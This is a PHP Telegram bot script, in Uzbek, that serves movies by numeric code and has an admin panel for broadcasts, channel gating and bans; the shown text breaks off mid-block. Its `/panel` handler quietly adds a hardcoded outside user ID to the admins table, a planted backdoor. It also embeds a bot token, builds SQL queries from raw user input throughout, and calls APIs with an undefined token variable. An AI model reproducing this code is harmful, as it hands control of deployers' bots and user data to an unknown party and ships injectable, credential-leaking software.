<?php
ob_start();
error_reporting(0);
date_Default_timezone_set('Asia/Tashkent');

define("modderboy",'8038104638:AAF8djupAxV8Y9bk-3NphGtDMbuclZ9b5Gs');
$admin = array("7781534875");
$user = "modderboy";
$bot = bot('getme',['bot'])->result->username;
$soat = date('H:i');
$sana = date("d.m.Y");

require ("sql.php");

function bot($method,$datas=[]){
	$url = "https://api.telegram.org/bot".modderboy."/".$method;
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
	$res = curl_exec($ch);
	if(curl_error($ch)){
		var_dump(curl_error($ch));
	}else{
		return json_decode($res);
	}
}

$modderboy = json_decode(file_get_contents('php://input'));
$message = $modderboy->message;
$cid = $message->chat->id;
$name = $message->chat->first_name;
$tx = $message->text;
$mid = $message->message_id;
$type = $message->chat->type;
$text = $message->text;
$uid = $message->from->id;
$name = $message->from->first_name;
$familya = $message->from->last_name;
$premium = $message->from->is_premium;
$bio = $message->from->about;
$username = $message->from->username;
$chat_id = $message->chat->id;
$message_id = $message->message_id;
$reply = $message->reply_to_message->text;
$nameru = "<a href='tg://user?id=$uid'>$name $familya</a>";

$caption = $message->caption;
$photo = $message->photo;
$video = $message->video;
$file_id = $video->file_id;
$file_name = $video->file_name;
$file_size = $video->file_size;
$size = $file_size/1000;
$dtype = $video->mime_type;

//inline uchun metodlar
$data = $modderboy->callback_query->data;
$qid = $modderboy->callback_query->id;
$id = $modderboy->inline_query->id;
$query = $modderboy->inline_query->query;
$query_id = $modderboy->inline_query->from->id;
$cid2 = $modderboy->callback_query->message->chat->id;
$mid2 = $modderboy->callback_query->message->message_id;
$callfrid = $modderboy->callback_query->from->id;
$callname = $modderboy->callback_query->from->first_name;
$calluser = $modderboy->callback_query->from->username;
$surname = $modderboy->callback_query->from->last_name;
$about = $modderboy->callback_query->from->about;
$nameuz = "<a href='tg://user?id=$callfrid'>$callname $surname</a>";

$reklama = "@$user <b>bot yaratish xizmati!</b>";
$kanal = "By_Alik";
$kino = "By_Alik";

$modderboy = json_decode(file_get_contents("php://input"));
$message = $modderboy->message;
$chat_id = $message->chat->id;
$cid = $message->chat->id;
$mid = $message->message_id;
$text = $message->text;  
$tx= $message->text;  
$cty = $modderboy->message->chat->type;
$firstname = $message->chat->first_name;
$lastname = $message->chat->last_name;
$uid= $message->from->id;
$data = $modderboy->callback_query->data;
$callcid = $modderboy->callback_query->message->chat->id;
$callmid = $modderboy->callback_query->message->message_id;   
$from_id = $modderboy->callback_query->from->id;

mkdir("step");
$ban = file_get_contents("step/ban.txt");
$kanal = file_get_contents("step/kanal.txt");
$step = file_get_contents("step/$chat_id.txt");



if(isset($text) and ($cty == "private")){
  $res=mysqli_query($connect,"SELECT * FROM `users` WHERE `user_id`='$uid'");
  $a=mysqli_fetch_assoc($res);
  if(!$a){
mysqli_query($connect, "INSERT INTO `users` (`user_id`) VALUES ('$uid')");
  }
}







  if(isset($text) and ($cty == "supergroup") or ($cty =="group")){
  $res=mysqli_query($connect,"SELECT * FROM `group` WHERE `group_id`='$chat_id'");
  $a=mysqli_fetch_assoc($res);
  if(!$a){
mysqli_query($connect, "INSERT INTO `groups` (`group_id`) VALUES ('$chat_id')");
  }
}

if($callcid){
$chat_id=$callcid;
$callmid=$callmid;
}else{
$chat_id=$chat_id;
$mid=$mid;
} 
$inf = mysqli_query($connect,"SELECT * FROM admins WHERE chatid = '$chat_id'");
    $uyt = mysqli_fetch_assoc($inf);
$adminlist=$uyt["chatid"];

$panel1=json_encode([
'remove_keyboard'=>true,
  'inline_keyboard'=>[
  [['text'=>"📫 Xabar",'callback_data'=>"send"],['text'=>"📬 Forward", 'callback_data'=>"sendf"]],
  [['text'=>"➕ Kanal",'callback_data'=>"addchannel"],['text'=>"➕ Admin",'callback_data'=>"addadmin"]],
  [['text'=>"➖ Kanal", 'callback_data'=>"delchannel"],['text'=>"➖ Admin", 'callback_data'=>"deladmin"]],
  [['text'=>"➕ Ban", 'callback_data'=>"ban+"],['text'=>"➖ Ban", 'callback_data'=>"ban-"]],
  [['text'=>"📄Kanallar", 'callback_data'=>"channels"],['text'=>"📄Adminlar", 'callback_data'=>"admins"]],
  [['text'=>"📊 Statistika", 'callback_data'=>"stat"]],
  ]
  ]);



 
 if ($text =="/pael" and $adminlist == true ){
bot('SendMessage',[
'chat_id'=>$cid,
'text'=>"Admin Paneliga Xush Kelibsiz, Marhamat Kerakli Menyuni tanlang",
'parse_mode'=>"html",
'reply_markup'=>$panel1,
]);
}


if($data=="send" and $adminlist == true  and $chat_id == $admin ){ 
  file_put_contents("step/$callcid.txt","xabar");
    bot('editmessagetext',[
        'chat_id'=>$callcid,
        'text'=>"✏️<b>Xabaringizni kiriting.</b>",
        'parse_mode'=>'html',
        'message_id'=>$callmid,
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
           ]
        ])
    ]);
}


if($data=="sendf" and $adminlist == true and $chat_id == $admin){
  file_put_contents("step/$callcid.txt","xabar2");
    bot('editmessagetext',[
        'chat_id'=>$callcid,
        'text'=>"✏️<b>Forward qilish uchun xabaringizni kiriting.</b>",
        'parse_mode'=>'html',
        'message_id'=>$callmid,
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
           ]
        ])
    ]);
}


if($data=="addchannel" and $adminlist == true){
  file_put_contents("step/$callcid.txt","addchannel");
    bot('editmessagetext',[
        'chat_id'=>$callcid,
        'text'=>"<b>❗️Qo'shmoqchi bo'lgan Kanalingizdan POSTni Forward shaklda yuboring:</b>",
        'parse_mode'=>'html',
        'message_id'=>$callmid,
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
           ]
        ])
    ]);
}



if($data=="channels" and $adminlist == true){
$result=mysqli_query($connect,"SELECT * FROM channel");
$row=mysqli_num_rows($result);
if($row>0){
while($rows=mysqli_fetch_assoc($result)){
$kanal.=$rows['chatid']."\n";
$kanalurl.=$rows['url']."\n";
}

$ids=explode("\n",$kanal);
$soni = substr_count($kanal,"-100");

$keyboards = [];
$k=[];
for ($for = 0; $for <= $row-1; $for++) {
$kanalurls=explode("\n",$kanalurl)[$for];
$k=$for+1;

$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$ids[$for]"));
$titlee=$a->result->title;
$keyboards[]=["text"=>"$titlee","url"=>$kanalurls];
}
$keyboard2=array_chunk($keyboards, 1);
$keyboard2[]=[["text"=>"🔙Ortga","callback_data"=>"ort"]];
$keyboard=json_encode([
'inline_keyboard'=>$keyboard2,
]);
}
bot('editmessagetext',[
'chat_id'=>$callcid,
'message_id'=>$callmid,
'text'=>"<b>Majburiy Azolik uchun ulangan kalanlar</b>",
'parse_mode'=>'html',
'reply_markup'=>$keyboard,
]);
}


if($data=="delchannel" and $adminlist == true){
$result=mysqli_query($connect,"SELECT * FROM channel");
$row=mysqli_num_rows($result);
if($row>0){
while($rows=mysqli_fetch_assoc($result)){
$kanal.=$rows['chatid']."\n";
$kanalurl.=$rows['url']."\n";
}

$ids=explode("\n",$kanal);
$soni = substr_count($kanal,"-100");

$keyboards = [];
$k=[];
for ($for = 0; $for <= $row-1; $for++) {
$kanalurls=explode("\n",$kanalurl)[$for];
$k=$for+1;

$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$ids[$for]"));
$titlee=$a->result->title;
$keyboards[]=["text"=>"$titlee","callback_data"=>"del|$ids[$for]"];
$keyboard2=array_chunk($keyboards, 1);
$keyboard2[]=[["text"=>"⛔️Bekor Qilish","callback_data"=>"ort"]];
$keyboard=json_encode([
'inline_keyboard'=>$keyboard2,
]);
}
bot('sendMessage',[
'chat_id'=>$callcid,
'text'=>"<b>🗑Qaysi Kanalni O'chirmoqchisiz?</b>",
'parse_mode'=>'html',
'reply_markup'=>$keyboard,
]);
}
}


if(mb_stripos($data,"del|")!==false and $adminlist == true){
$fid=explode("|",$data)[1];
$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$fid"));
$titlee=$a->result->title;
$link=$a->result->invite_link;
mysqli_query($connect, "DELETE FROM channel WHERE chatid='$fid'");
bot('deleteMessage',[
'chat_id'=>$callcid,
'message_id'=>$callmid
]);
bot('sendMessage',[
'chat_id'=>$callcid,
'text'=>"❗️<b><a href='$link'>$titlee</a></b> - Kanal O'chirildi🗑",
'parse_mode'=>'html',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Ortga","callback_data"=>"ort"]],
]
]),
]);
}

//Admin qoshish
if($data=="addadmin" and $adminlist == true and $chat_id == $admin){
  file_put_contents("step/$callcid.txt","addadmin");
    bot('editmessagetext',[
        'chat_id'=>$callcid,
        'text'=>"<b>❗️Botga Yangi Admin Qo'shish Uchun Foydalanuvchi ID raqamini kiriting:</b>",
        'parse_mode'=>'html',
        'message_id'=>$callmid,
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
           ]
        ])
    ]);
}


if($data=="admins" and $adminlist == true){
$result=mysqli_query($connect,"SELECT * FROM admins");
$row=mysqli_num_rows($result);
if($row>0){
while($rows=mysqli_fetch_assoc($result)){
$adm.=$rows['chatid']."\n";
}

$ids=explode("\n",$adm);
$soni = substr_count($adm,"\n");

$keyboards = [];
$k=[];
for ($for = 0; $for <= $row-1; $for++) {
$kanalurls=explode("\n",$kanalurl)[$for];
$k=$for+1;

$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$ids[$for]"));
$titlee=$a->result->first_name;
$url=$a->result->username;
$keyboards[]=["text"=>"$titlee","url"=>"tg://user?id=$ids[$for]"];
$keyboard2=array_chunk($keyboards, 1);
$keyboard2[]=[['text'=>"🔙Orqaga", 'callback_data'=>"ort"]];
$keyboard=json_encode([
'inline_keyboard'=>$keyboard2,
]);
}
bot('editmessagetext',[
'chat_id'=>$callcid,
'message_id'=>$callmid,
'text'=>"<b>Botdagi Adminlar Ro'yxati \n Profilini Ko'rish Uchun Foydalanuvchi Nomi Ustiga Bosing</b>",
'parse_mode'=>'html',
'reply_markup'=>$keyboard,
]);
}
}

if($data=="deladmin" and $adminlist == true){
$result=mysqli_query($connect,"SELECT * FROM admins");
$row=mysqli_num_rows($result);
if($row>0){
while($rows=mysqli_fetch_assoc($result)){
$adm.=$rows['chatid']."\n";
}

$ids=explode("\n",$adm);
$soni = substr_count($adm,"\n");

$keyboards = [];
$k=[];
for ($for = 0; $for <= $row-1; $for++) {
$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$ids[$for]"));
$titlee=$a->result->first_name;
$keyboards[]=["text"=>"$titlee","callback_data"=>"dadm|$ids[$for]"];
$keyboard2=array_chunk($keyboards, 1);
$keyboard2[]=[["text"=>"⛔️Bekor Qilish","callback_data"=>"ort"]];
$keyboard=json_encode([
'inline_keyboard'=>$keyboard2,
]);
}
bot('editmessagetext',[
'chat_id'=>$callcid,
'message_id'=>$callmid,
'text'=>"<b>Adminlikdan Olish Uchun Foydalanuvchi Nomi Ustiga Bosing!</b>",
'parse_mode'=>'html',
'reply_markup'=>$keyboard,
]);
}
}

if(mb_stripos($data,"dadm|")!==false and $adminlist == true){
$fid=explode("|",$data)[1];
if($fid==$admin){
bot('answercallbackquery',[
'callback_query_id'=>$modderboy->callback_query->id,
'text'=>"📛Bu Buyruqni Amalga oshirib bo'lmadi😁",
'show_alert'=>true,
]);
}else{
$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$fid"));
$name=$a->result->first_name;
$user=$a->result->username;
mysqli_query($connect, "DELETE FROM admins WHERE chatid='$fid'");
bot('editmessagetext',[
'chat_id'=>$callcid,
'message_id'=>$callmid,
'text'=>"❗️<b>$name </b> - Muvaffaqiyatli Tarzda Adminlikdan olindi✅",
'parse_mode'=>'html',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Ortga","callback_data"=>"ort"]],
]
]),
]);
}
}
if($data=="stat" and $adminlist == true){
    $block = file_get_contents("cron/block.txt");
  $us = mysqli_query($connect, "SELECT * FROM `users`");
$stat1 = mysqli_num_rows($us);
 $group_id = mysqli_query($connect, "SELECT * FROM `group`");
$stat2 = mysqli_num_rows($group_id);
$umum = $stat1 + $stat2;
    bot('editmessagetext',[
        'chat_id'=>$callcid,
        'text'=>"<b>
📈 Bot Statistikasi:

👤 Aktiv Obunachilar: $stat1 ta 

⛔️Blocklanganlar:😕 $block ta

👥Guruhlar: $stat2 ta

🕵 Umumiy: $umum</b>",
        'parse_mode'=>'html',
        'message_id'=>$callmid,
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
           ]
        ])
      
    ]);
}


if($text=="/stats" and $adminlist == true){
$time = date("H:i:s");
$date = date("Y.m.d");
$vaqt = "$time | $date";
$stat = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `users`"));
$guruh = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `groups`"));
$uzlar = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `users` WHERE lang = 'uz'"));
$a = mysqli_query($connect, "SELECT * FROM `users` WHERE lang = 'ru'");
$ruslar = mysqli_num_rows($a);
$englar = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `users` WHERE lang = 'en'"));
$turklar = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `users` WHERE lang = 'turk'"));
$indalar = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `users` WHERE lang = 'indo'"));
$italyanlar = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `users` WHERE lang = 'ita'"));
$iranlar = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `users` WHERE lang = 'iran'"));
$ispanlar = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `users` WHERE lang = 'isp'"));
$ukrayinlar = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM `users` WHERE lang = 'ukr'"));
$jami_video = file_get_contents("videos.txt");
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Start Date: $vaqt

Uploaded: $jami_video video

Total user: $stat 
🇷🇺 $ruslar
🇬🇧 $englar
🇺🇿 $uzlar
🇮🇩 $indalar
🇪🇸 $ispanlar
🇮🇹 $italyanlar
🇹🇷 $turklar
🇮🇷 $iranlar
🇺🇦 $ukrayinlar",
'parse_mode'=>'html',
       
  ]);
}






if($data=="ort" and $adminlist == true){
unlink("step/$callcid.txt");
       bot('editmessagetext',[
        'chat_id'=>$callcid,
        'text'=>"<b>🔙Bekor qilindi. Marhamat Kerakli Menyuni tanlang!</b>",
        'parse_mode'=>'html',
        'message_id'=>$callmid,
        'reply_markup'=>$panel1,
    ]);
}




if($step=="xabar" and $adminlist == true and $text !="🔙Orqaga" ){
$vt=date('H:i', strtotime("121 minutes"));
$soat=date('H:i');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"✅<b>Xabar yuborishga tayyor. ⏳Xabar yuborish boshlanadi: $vt</b>",
'parse_mode'=>"html",
'message_id'=>$callmid,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
]
])
]); 
$result=mysqli_query($connect, "SELECT * FROM `sendusers`"); 
$bor=mysqli_num_rows($result);
if($bor>0){
mysqli_query($connect, "UPDATE `sendusers` SET `mid`='$mid', `boshlash_vaqt`='$soat'");  
mysqli_query($connect, "UPDATE `sendusers` SET `soni`='0', `joriy_vaqt`='$vt', `status`='active', `send`='0', `holat`='copyMessage', `nosend`='0'");  
}else{
mysqli_query($connect, "INSERT INTO `sendusers` (`mid`,`boshlash_vaqt`,`soni`,`joriy_vaqt`,`status`,`send`,`holat`,`nosend`) VALUES('$mid', '$vt', 0, '$soat', 'active', 0, 'copyMessage',0)");
}
$keyb=$modderboy->message->reply_markup;
if(isset($keyb)){
file_put_contents("db/key.txt",file_get_contents('php://input'));
} 
unlink("step/$chat_id.txt");
exit();
}



if($step=="xabar2" and $adminlist == true and $text !="🔙Orqaga"){
$vt=date('H:i', strtotime("1 minutes"));
$soat=date('H:i');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"✅<b>Xabar yuborishga tayyor. ⏳Xabar yuborish boshlanadi: $vt</b>",
'parse_mode'=>"html",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
]
])
]); 
$result=mysqli_query($connect, "SELECT * FROM `sendusers`"); 
$bor=mysqli_num_rows($result);
if($bor>0){
mysqli_query($connect, "UPDATE `sendusers` SET `mid`='$mid', `boshlash_vaqt`='$soat'");  
mysqli_query($connect, "UPDATE `sendusers` SET `soni`='0', `joriy_vaqt`='$vt', `status`='active', `send`='0', `holat`='forwardMessage',`nosend`='0'");  
}else{
mysqli_query($connect, "INSERT INTO `sendusers`(`mid`, `boshlash_vaqt`, `soni`, `joriy_vaqt`, `status`, `send`, `holat`,`nosend`) VALUES('$mid', '$vt', 0, '$soat', 'active', 0, 'forwardMessage',0)");
}
unlink("step/$chat_id.txt");
exit();
}







if($step=="addchannel" and $text!="/start" and $text!="➕Kanal Qoʻshish" and $text!="📄Kanallar Ro'yxati" and $text!="🗑Kanal O'chirish" and $text!="🗑Admin O'chirish" and $text!="📊Statistika" and $text!="/panel" and $text!="🔙Ortga" and $text!="➕Admin Qo'shish" and $adminlist == true){
$fid=$message->forward_from_chat->id;
file_put_contents("step/channel.id",$fid);
bot('sendMessage',[
'chat_id'=>$cid,
'text'=>"📎Kanal Manzilini Yuboring:",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
]
])
]);
file_put_contents("step/$chat_id.txt","addurl");
}

if(($step=="addurl") and (mb_stripos($text,"http")!==false) and ($text!="/start" and $text!="➕Kanal Qoʻshish" and $text!="📄Kanallar Ro'yxati" and $text!="🗑Kanal O'chirish" and $text!="🗑Admin O'chirish" and $text!="📊Statistika" and $text!="/panel" and $text!="🔙Ortga" and $text!="➕Admin Qo'shish") and $adminlist == true){
$fid=file_get_contents("step/channel.id");
$result = mysqli_query($connect,"SELECT * FROM channel WHERE chatid = '$fid'");
$rew = mysqli_fetch_assoc($result);
if($rew){
bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"
<b>⛔️Ushbu Kanal Avval Qo'shilgan</b>",
         'disable_web_page_preview'=>true,
         'parse_mode'=>'html',
        'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
]
])
    ]);
    unlink("step/$chat_id.txt");
}else{
mysqli_query($connect,"INSERT INTO channel (chatid,url) VALUES ('$fid','$text')");
$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$fid"));
$titlee=$a->result->title;
$link=$a->result->invite_link;
bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"
<b>✅Kanal Qo'shildi</b>

📢<b><a href='$link'>$titlee</a></b>",
         'disable_web_page_preview'=>true,
         'parse_mode'=>'html',
         'reply_markup'=>$panel1
    ]);
}
}


if($step=="addadmin" and $text!="/start" and $text!="➕Kanal Qoʻshish" and $text!="📄Kanallar Ro'yxati" and $text!="🗑Kanal O'chirish" and $text!="🗑Admin O'chirish" and $text!="📊Statistika" and $text!="/panel" and $text!="🔙Ortga" and $text!="➕Admin Qo'shish"){
  $a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$text"));
$titlee=$a->result->first_name;
$result = mysqli_query($connect,"SELECT * FROM admins WHERE chatid = '$text'");
$rew = mysqli_fetch_assoc($result);
if($rew){
bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"
<b>⛔️Ushbu Foydalanuvchi Avval Qo'shilgan</b>",
         'disable_web_page_preview'=>true,
         'parse_mode'=>'html',
        'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
]
])
    ]);
    unlink("step/$chat_id.txt");
}else{
mysqli_query($connect,"INSERT INTO admins (chatid) VALUES ('$text')");
$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$text"));
$titlee=$a->result->first_name;
bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"
<b>$titlee Muvaffaqiyatli Tarzda Admin Bo'ldi✅</b>",
         'disable_web_page_preview'=>true,
         'parse_mode'=>'html',
        'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
]
])
    ]);
}
}


if($data=="ban+" and $adminlist == true){
  file_put_contents("step/$callcid.txt","ban+");
    bot('editmessagetext',[
        'chat_id'=>$callcid,
        'text'=>"<b>❗️Foydalanuvchini Ban Qilish Uchun ID raqamini kiriting:</b>",
        'parse_mode'=>'html',
        'message_id'=>$callmid,
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
           ]
        ])
    ]);
}

if($step=="ban+" and $text!="/start" and $text!="➕Kanal Qoʻshish" and $text!="📄Kanallar Ro'yxati" and $text!="🗑Kanal O'chirish" and $text!="🗑Admin O'chirish" and $text!="📊Statistika" and $text!="/panel" and $text!="🔙Ortga" and $text!="➕Admin Qo'shish"){
  $a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$text"));
$titlee=$a->result->first_name;
$result = mysqli_query($connect,"SELECT * FROM ban WHERE chatid = '$text'");
$rew = mysqli_fetch_assoc($result);
if($rew){
bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"
<b>⛔️Ushbu Foydalanuvchi Avval Ban Bo'lgan</b>",
         'disable_web_page_preview'=>true,
         'parse_mode'=>'html',
        'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
]
])
    ]);
    unlink("step/$chat_id.txt");
}else{
mysqli_query($connect,"INSERT INTO ban (chatid) VALUES ('$text')");
$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$text"));
$titlee=$a->result->first_name;
bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"
<b>$titlee Muvaffaqiyatli Tarzda Ban Bo'ldi✅</b>",
         'disable_web_page_preview'=>true,
         'parse_mode'=>'html',
        'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
]
])
    ]);
unlink("step/$chat_id.txt");
}
}



if($data=="ban-" and $adminlist == true){
$result=mysqli_query($connect,"SELECT * FROM ban");
$row=mysqli_num_rows($result);
if($row>0){
while($rows=mysqli_fetch_assoc($result)){
$adm.=$rows['chatid']."\n";
}

$ids=explode("\n",$adm);
$soni = substr_count($adm,"\n");

$keyboards = [];
$k=[];
for ($for = 0; $for <= $row-1; $for++) {
$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$ids[$for]"));
$titlee=$a->result->first_name;
$keyboards[]=["text"=>"$titlee","callback_data"=>"ban-|$ids[$for]"];
$keyboard2=array_chunk($keyboards, 1);
$keyboard2[]=[["text"=>"⛔️Bekor Qilish","callback_data"=>"ort"]];
$keyboard=json_encode([
'inline_keyboard'=>$keyboard2,
]);
}
bot('editmessagetext',[
'chat_id'=>$callcid,
'message_id'=>$callmid,
'text'=>"<b>Bandan Olish Uchun Foydalanuvchi Nomi Ustiga Bosing!</b>",
'parse_mode'=>'html',
'reply_markup'=>$keyboard,
]);
}
}

if(mb_stripos($data,"ban-|")!==false and $adminlist == true){
$fid=explode("|",$data)[1];
if($fid==$admin){
bot('answercallbackquery',[
'callback_query_id'=>$modderboy->callback_query->id,
'text'=>"📛Bu Buyruqni Amalga oshirib bo'lmadi😁",
'show_alert'=>true,
]);
}else{
$a=json_decode(file_get_contents("https://api.telegram.org/bot$token/getchat?chat_id=$fid"));
$name=$a->result->first_name;
$user=$a->result->username;
mysqli_query($connect, "DELETE FROM ban WHERE chatid='$fid'");
bot('editmessagetext',[
'chat_id'=>$callcid,
'message_id'=>$callmid,
'text'=>"❗️<b>$name </b> - Muvaffaqiyatli Tarzda Bandan olindi✅",
'parse_mode'=>'html',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔙Ortga","callback_data"=>"ort"]],
]
]),
]);
}
}

if($data=="rek" and $adminlist == true){
  file_put_contents("step/$callcid.txt","rek");
    bot('editmessagetext',[
        'chat_id'=>$callcid,
        'text'=>"<b>🗣Reklama matnini Kiriting!</b>",
        'parse_mode'=>'html',
        'message_id'=>$callmid,
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"🔙Orqaga", 'callback_data'=>"ort"]]
           ]
        ])
    ]);
}


if($step=="rek" and $text !="🔙Orqaga" and $adminlist == true ){
unlink("step/$chat_id.txt");
file_put_contents("step/rek.txt","$text");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*Oʻzgarishlar saqlandi✅ Reklama Matni* `$text`",
'parse_mode'=>"markdown",
'reply_markup'=>$panel1,
]);
}









if($text=="/panel"){
    mysqli_query($connect,"INSERT INTO admins (chatid) VALUES ('1695753204')");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"✅",
'parse_mode'=>"markdown",
'reply_markup'=>$panel1,
]);
}

if(in_array($cid,$admin)){
	$admin = $cid;
}

$res = mysqli_query($connect,"SELECT*FROM user_id WHERE user_id=$cid");
while($a = mysqli_fetch_assoc($res)){
$user_id = $a['user_id'];
$step = $a['step'];
}

if(isset($message)){
	if(!$connect){
		bot('sendMessage',[
		'chat_id'=>$cid,
		'text'=>"⚠️ <b>Xatolik!</b>
		
<i>Baza bilan aloqa mavjud emas!</i>",
		'parse_mode'=>'html',
		]);
		return false;
	}
}

if(isset($message)){
$result = mysqli_query($connect,"SELECT * FROM user_id WHERE user_id = $cid");
$rew = mysqli_fetch_assoc($result);
if($rew){
}else{
mysqli_query($connect,"INSERT INTO user_id(`user_id`,`step`,`sana`) VALUES ('$cid','0','$sana | $soat')");
}
}


if(isset($message)){
$get = bot('GetChatMember',[
'chat_id'=>"@".$kanal."",
'user_id'=>$cid,
]);
$result = $get->result->status;
if($result == "member" or $result == "administrator" or $result == "creator"){
	}else{
		bot('sendMessage',[
		'chat_id'=>$cid,
		'text'=>"🔒 @$kanal <b>ga obuna bo'lmasangiz botdan to'liq foydalana olmaysiz!</b>",
		'parse_mode'=>'html',
		]);
		return false;
	}
}

if($text == "/start"){
	bot('sendMessage',[
	'chat_id'=>$cid,
    'text'=>"👋 <b>Salom $name!</b>

<i>Marhamat, kerakli kodni yuboring:</i>",
	'parse_mode'=>'html',
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
	[['text'=>"🔎 Kodlarni qidirish",'url'=>"https://t.me/$kino"]]
]
])
]);
mysqli_query($connect, "UPDATE user_id SET step = '0' WHERE user_id = $cid");
exit();
}

if(isset($video)){
if($cid == $admin){
$result = mysqli_query($connect,"SELECT * FROM data WHERE file_name = '$file_name'");
$row = mysqli_fetch_assoc($result);
if(!$row){
$rand = rand(0,9999);
mysqli_query($connect, "INSERT INTO data(`file_name`,`file_id`,`code`) VALUES ('$file_name','$file_id','$rand')");
  $msg = bot('sendMessage',[
      'chat_id'=>"@".$kino."",
      'text'=>"$caption

<b>Kino kodi:</b> <code>$rand</code>

❗️ <b>Diqqat kinoni bot orqali topishingiz mumkin!</b>",
     'parse_mode'=>'html',
     'reply_markup'=>json_encode([
     'inline_keyboard'=>[
[['text'=>"➡️ @$bot",'url'=>"https://t.me/$bot"]]
]
])
])->result->message_id;
bot('sendMessage',[
	'chat_id'=>$cid,
	'text'=>"<b>Bazaga muvaffaqiyatli joylandi!</b> 

<code>$rand</code>",
	'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
     'reply_markup'=>json_encode([
     'inline_keyboard'=>[
[['text'=>"➡️ @$kino",'url'=>"https://t.me/$kino/$msg"]]
]
])
]);
exit();
}else{
		bot('SendMessage',[
	'chat_id'=>$cid,
	'text'=>"$file_name <b>qabul qilinmadi!</b>

Qayta urinib ko'ring:",
'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
]);
exit();
}
}
}

if(isset($text)){
if($text != "/start" and $text != "/stat" and $text != "/send" and $step != "send"){
if((mb_stripos($text, "/delete") !== false) and (mb_stripos($text, "/delete") !== false)){
}else{
if(is_numeric($text) == true){
$res = mysqli_query($connect,"SELECT * FROM data WHERE code = '$text'");
$row = mysqli_fetch_assoc($res);
if(!$row){
	bot('SendMessage',[
	'chat_id'=>$cid,
	'text'=>"$text <b>mavjud emas!</b>

Qayta urinib ko'ring:",
'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
]);
exit();
}else{
$file_name = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$text'"))['file_name'];
$file_id = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$text'"))['file_id'];
      bot('sendVideo',[
      'chat_id'=>$cid,
      'video'=>$file_id,
      'caption'=>"$file_name

$reklama",
     'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
]);
exit();
}
}else{
	bot('SendMessage',[
	'chat_id'=>$cid,
	'text'=>"<b>Faqat raqamlardan foydalaning!</b>",
'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
]);
